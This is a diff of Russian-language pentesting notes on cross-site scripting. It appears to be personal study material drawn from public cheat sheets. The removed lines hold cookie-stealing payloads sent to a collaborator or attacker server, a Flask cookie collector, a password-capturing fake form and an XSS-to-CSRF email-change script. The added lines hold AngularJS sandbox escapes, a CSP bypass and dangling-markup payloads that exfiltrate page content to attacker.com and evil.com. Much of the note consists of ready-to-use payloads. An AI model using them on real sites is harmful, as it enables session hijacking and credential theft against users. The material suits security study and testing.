@@ -3,70 +3,16 @@
 ***
 # Навигация
 
-> [[XSS#Exploiting cross-site scripting to steal cookies|1. Exploiting cross-site scripting to steal cookies]]
-> [[XSS#XSS в HTML атрибутах|2. XSS в HTML атрибутах]]
-> [[XSS### XSS into JavaScript|3. ## XSS into JavaScript]]
+> [[XSS#XSS в HTML атрибутах|1. XSS в HTML атрибутах]]
+> [[XSS### XSS into JavaScript|2. XSS into JavaScript]]
+> [[XSS#CSTI - Client side template injection|3. CSTI - Client side template injection]]
+> [[XSS#Dangling Markup|4. Dangling Markup]]
+> [[XSS#**CSP**|5. CSP]]
+> [[XSS#Self-XSS|6. Self-XSS ]]
+> [[XSS#PDF-XSS|7. PDF-XSS]]
+> [[XSS#Mutation XSS|8. Mutation XSS]]
+> [[XSS#Bliend XSS|9. Bliend XSS]]
 ***
-# Exploiting cross-site scripting to steal cookies
-
-[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)
-Пример в CORS: 
-```
-<script>
-  fetch('https://<SESSION>.burpcollaborator.net', {
-  method: 'POST',
-  mode: 'no-cors',
-  body: document.cookie
-  });
-</script>
-```
-или
-```
-<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
-```
-### Python web-server to take cookie:
-```python
-from flask import Flask, request
-
-app = Flask(__name__)
-
-@app.route('/', methods=['POST'])
-def handle_post():
-	message = request.data.decode('utf-8')
-	print("Received message:", message)
-	return 'Message recieved'
-if __name__ == '__main__':
-	app.run(port=8080)
-```
-#### Atack payload
-```javascript
-<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }}); ">
-```
-```javascript
-<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }}); ">
-```
-### Exploiting cross-site scripting to capture passwords
-Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
-```javascript
-<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
-```
-### Exploiting XSS to perform CSRF
-**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
-```javascript
-<script>  
-var req = new XMLHttpRequest();  
-req.onload = handleResponse;  
-req.open('get','/my-account',true);  
-req.send();  
-function handleResponse() {  
-var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
-var changeReq = new XMLHttpRequest();  
-changeReq.open('post', '/my-account/change-email', true);  
-changeReq.send('csrf='+token+'&email=test@test.com')  
-};  
-</script>
-```
-
 # XSS в HTML атрибутах
 
 [portswigger.net/XSS/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
@@ -98,7 +44,37 @@ changeReq.send('csrf='+token+'&email=test@test.com')
 [XSS in Angular.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
 **CSTI** - тип уязвимости, возникающий, когда разработчик позволяет пользовательскому вводу определять выражения шаблонов на веб-странице, что позволяет злоумышленнику внедрять вредоносные выражения шаблонов (которые являются упрощённым JavaScript) для эксплуатации веб-приложения. Это происходит в браузере и HTML, аналогично тому, как работает межсайтовый скриптинг (XSS). Некоторые JS фреймворки, такие как AngularJS, имеют песочницу, которая предотвращает использование определённых объектов, к которым разработчик не имел права доступа. Чтобы злоумышленник мог эксплуатировать это, ему нужно найти способ "выбраться" из песочницы, что означает получение доступа к областям, таким как объект документа, чтобы проэксплуатировать веб-приложение.
 
-# CSP директивы 
+>Также иногда с помощью CSTI могут обходить CSP, допустим он разрешает погружать скрипты ток с [some.com](http://some.com/), вы идёте туда, находите там Angular.js файл, а дальше подключаете его к странице, внедряете директиву ng-app и вставляете пэйлоад:
+
+`<script src='<https://some.com/angular.min.js>'></script><div ng-app>{{$on.constructor.constructor('alert(document.domain)')()}}`
+
+Для эксплуатации CSTI в Angular без песочницы используют следующую полезную нагрузку:
+
+`{{$on.constructor('alert(1)')()}}`
+# Dangling Markup
+Кража данных посредством эксплуатации пэйлоада с открывающейся `'`, но не закрывая её:
+[Dangling Markup - HTML scriptless injection | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)
+```html 
+<img src='http://attacker.com/log.php?HTML=
+```
+```html
+<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
+```
+```html
+<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
+```
+# **CSP**
+[Content Security Policy (CSP) Bypass | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
+
+<div style="margin:5px; padding:5px; background-color: #E56D3D"><b>CSP (Content Security Policy)</b> - позволяет определять белые списки источников для подключения JavaScript, стилей, изображений, фреймов, создания соединений. </div>
+
+<div style="margin:5px; padding:5px; background-color: #E56D3D">Также CSP может регулировать возможность исполнения inline-скриптов, возможность подключения текущей страницы во фрейме и т. д.</div>
+
+CSP — это механизм безопасности браузера, целью которого является смягчение XSS и некоторых других атак. Он работает путем ограничения ресурсов (таких как скрипты и изображения), которые может загружать страница, и ограничения возможности включения страницы в рамки других страниц. 
+
+Чтобы включить CSP, ответ должен включать заголовок `Content-Security-Policy` со значением, содержащим политику. Сама политика состоит из одной или нескольких директив, разделенных точкой с запятой.
+## CSP директивы 
+
 [CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/) - сервис для проверки на безопасность веб-страницы по её CSP тегам. 
 ![[CSP директивы.png]]
 
